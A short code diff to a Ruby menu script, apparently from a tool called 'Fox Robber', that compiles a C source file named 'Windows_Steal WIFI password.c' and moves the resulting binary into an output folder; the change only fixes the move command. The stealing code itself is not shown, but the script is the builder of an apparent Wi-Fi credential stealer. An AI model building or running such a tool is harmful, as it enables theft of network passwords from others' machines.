@@ -52,8 +52,9 @@ while true
             puts 'File made by Fox Robber 🦊'
             system('gcc Windows/Windows_Steal\ WIFI\ password.c')
             system('sleep 1')
-            system('mv a.out Windows_s.out Out/')
+            system('mv a.out Windows_s.out')
             system('sleep 1')
+            system('mv Windows_s.out Out/')
             system("echo \"\t<Press enter>\" | lolcat -a")
             gets.chomp
             break
